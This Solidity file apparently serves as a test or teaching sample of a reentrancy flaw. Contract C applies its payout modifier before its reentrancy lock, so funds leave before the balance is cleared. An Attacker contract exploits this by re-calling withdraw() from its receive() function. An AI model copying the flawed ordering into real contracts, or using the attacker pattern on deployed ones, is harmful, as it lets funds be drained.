pragma solidity ^0.8.20;

// SPDX-License-Identifier: GPL-3.0
contract C {
    bool private flag = false;
    mapping (address => uint256) public balances;

    modifier nonReentrant() {
        require(!flag, "Locked");
        flag = true;
        _;
        flag = false;
    }

    modifier sendMoney() {
        uint amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = msg.sender.call{value:amt}("");
        require(success, "Call failed");
        _;
    }

    function withdraw() sendMoney nonReentrant public {
        balances[msg.sender] = 0;
    }

    function deposit() nonReentrant public payable {
        balances[msg.sender] += msg.value;
    }

}

contract Attacker {
    C private c;
    address to;
    constructor(address v, address _to) {
        to = _to;
        c = C(v);
    }
    
    function attack() public {
        c.deposit{value: 100}();
        c.withdraw();
        // now, if the address 'to' calls withdraw() then both the attacker and 'to' will own 100 each
    }

    receive() external payable {
        c.withdraw();
        // c.transfer(to, 100);
    } 
}